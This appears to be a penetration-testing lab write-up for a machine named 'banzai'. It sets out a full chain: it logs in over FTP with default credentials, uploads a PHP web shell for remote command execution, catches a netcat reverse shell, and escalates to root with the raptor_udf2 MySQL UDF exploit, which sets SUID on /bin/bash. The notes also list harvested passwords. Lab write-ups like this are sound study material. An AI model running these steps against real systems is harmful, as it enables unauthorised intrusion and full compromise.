# Export
```bash
export IP="192.168.127.56"
export URL="http://192.168.127.56:80/FUZZ"
```

<hr>

# Credentials
+ FTP: `admin:admin`
+ MYSQL: `root:EscalateRaftHubris123`

<hr>

# RCE
```bash
$ curl -s http://192.168.127.56:8295/cmback.php\?cmd=id    
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
$ nc -nlvp 8080                                                                                                                                                                         1 ⨯
listening on [any] 8080 ...
connect to [192.168.49.127] from (UNKNOWN) [192.168.127.56] 45134
bash: cannot set terminal process group (707): Inappropriate ioctl for device
bash: no job control in this shell
www-data@banzai:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

<hr>

# Privilege Escalation
+ `config.php` file

```bash
www-data@banzai:/var/www$ cat config.php 
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'EscalateRaftHubris123');
define('DBNAME', 'main');
?>
```

+ `MySQL` is vulnerable to User-Defined Function (UDF) exploit.

+ Download the `raptor_udf2.c` source code: https://www.exploit-db.com/exploits/1518

+ Compile.

```bash
admin@banzai:/dev/shm$ gcc -g -c raptor_udf2.c
admin@banzai:/dev/shm$ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

+ Load the function to MySQL

```bash
mysql> use mysql;
mysql> create table foo(line blob);
mysql> insert into foo values(load_file('/dev/shm/raptor_udf2.so'));
mysql> select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
mysql> create function do_system returns integer soname 'raptor_udf2.so';
mysql> select * from mysql.func;
+-----------+-----+----------------+----------+
| name      | ret | dl             | type     |
+-----------+-----+----------------+----------+
| do_system |   2 | raptor_udf2.so | function |
+-----------+-----+----------------+----------+
mysql> select do_system('chmod +s /bin/bash');
+---------------------------------+
| do_system('chmod +s /bin/bash') |
+---------------------------------+
|                               0 |
+---------------------------------+
1 row in set (0.00 sec)

mysql> \! sh
$ /bin/bash -p
bash-4.4# whoami
root
```

<hr>

# Nmap
```bash
PORT     STATE SERVICE    REASON         VERSION
21/tcp   open  ftp        syn-ack ttl 63 vsftpd 3.0.3
22/tcp   open  ssh        syn-ack ttl 63 OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 
25/tcp   open  smtp       syn-ack ttl 63 Postfix smtpd
5432/tcp open  postgresql syn-ack ttl 63 PostgreSQL DB 9.6.4 - 9.6.6 or 9.6.13 - 9.6.17
8080/tcp open  http       syn-ack ttl 63 Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: 403 Forbidden
8295/tcp open  http       syn-ack ttl 63 Apache httpd 2.4.25 ((Debian))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Banzai
```

<hr>

# FTP
+ Login as `admin:admin`

```bash
$ ftp $IP
Connected to 192.168.127.56.
220 (vsFTPd 3.0.3)
Name (192.168.127.56:root): admin
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    7 1001     0            4096 Jul 17  2020 .
drwxr-xr-x    7 1001     0            4096 Jul 17  2020 ..
drwxr-xr-x    2 1001     0            4096 May 26  2020 contactform
drwxr-xr-x    2 1001     0            4096 May 26  2020 css
drwxr-xr-x    3 1001     0            4096 May 26  2020 img
-rw-r--r--    1 1001     0           23364 May 27  2020 index.php
drwxr-xr-x    2 1001     0            4096 May 26  2020 js
drwxr-xr-x   11 1001     0            4096 May 26  2020 lib
226 Directory send OK.
```

+ Upload reverse shell

```bash
$ cat cmback.php 
<?php system($_GET['cmd']); ?>
ftp> put cmback.php
local: cmback.php remote: cmback.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
31 bytes sent in 0.00 secs (378.4180 kB/s)
```
